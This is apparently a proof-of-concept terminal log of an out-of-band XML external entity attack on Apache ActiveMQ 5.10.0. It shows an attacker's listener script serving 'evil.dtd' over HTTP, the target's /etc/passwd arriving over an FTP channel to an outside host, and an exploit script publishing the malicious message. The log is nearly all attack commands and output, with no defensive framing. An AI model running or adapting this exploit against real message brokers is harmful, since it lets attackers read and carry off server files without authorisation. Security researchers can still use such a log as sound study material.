Server Side

root@debian:~# /opt/apache-activemq-5.10.0/bin/activemq console
INFO: Loading '/etc/default/activemq'
INFO: Using java '/usr/bin/java'
INFO: Starting in foreground, this is just for debugging purposes (stop process by pressing CTRL+C)
INFO: changing to user 'activemq' to invoke java
 ...
WARN | Transport Connection to: tcp://192.168.141.143:53473 failed: java.io.EOFException
WARN | Transport Connection to: tcp://192.168.141.143:53476 failed: java.io.EOFException

Client Side

//  Prompt #1: Listening services for out-of-band XXE file extraction

root@debian:~/httpd# python multipurpose.py
[HTTP] Service listening...
[FTP] Service listening...
[HTTP] Client established a connection...
[HTTP] Dumping request...


GET /evil.dtd HTTP/1.1
User-Agent: Java/1.6.0_31
Host: 192.168.141.143:4444
Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
Connection: keep-alive


[HTTP] Serving our Document Type Definition...
[HTTP] Closing connection...

[FTP] Client established a connection...
[FTP] Closing connection...
[FTP] Dumping contents...

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
bin:x:2:2:bin:/bin:/bin/sh
sys:x:3:3:sys:/dev:/bin/sh
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/bin/sh
man:x:6:12:man:/var/cache/man:/bin/sh
lp:x:7:7:lp:/var/spool/lpd:/bin/sh
mail:x:8:8:mail:/var/mail:/bin/sh
news:x:9:9:news:/var/spool/news:/bin/sh
uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
proxy:x:13:13:proxy:/bin:/bin/sh
www-data:x:33:33:www-data:/var/www:/bin/sh
backup:x:34:34:backup:/var/backups:/bin/sh
list:x:38:38:Mailing List Manager:/var/list:/bin/sh
irc:x:39:39:ircd:/var/run/ircd:/bin/sh
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
libuuid:x:100:101::/var/lib/libuuid:/bin/sh
sshd:x:101:65534::/var/run/sshd:/usr/sbin/nologin
munmap:x:1000:1000:munmap,,,:/home/munmap:/bin/bash
messagebus:x:102:105::/var/run/dbus:/bin/false
activemq:x:103:106::/var/lib/activemq:/bin/bash
colord:x:104:109:colord colour management daemon,,,:/var/lib/colord:/bin/false
saned:x:105:110::/home/saned:/bin/false
openldap:x:106:111:OpenLDAP Server Account,,,:/var/lib/ldap:/bin/false
qpidd:x:107:113::/var/run/qpid:/bin/false
apacheds:x:999:999::/opt/apacheds-2.0.0-M17:/bin/sh
usbmux:x:108:46:usbmux daemon,,,:/home/usbmux:/bin

root@debian:~/httpd#

//  Prompt #2: Actual exploit

root@debian:~/ActiveMQ/XXE/exploit# ./run.sh
Building solution...
[Producer] Creating connection...
[Producer] Establishing session...
[Producer] Publishing message...
[Consumer] Creating connection...
[Consumer] Establishing session...
[Consumer] Consuming message...
root@debian:~/ActiveMQ/XXE/exploit#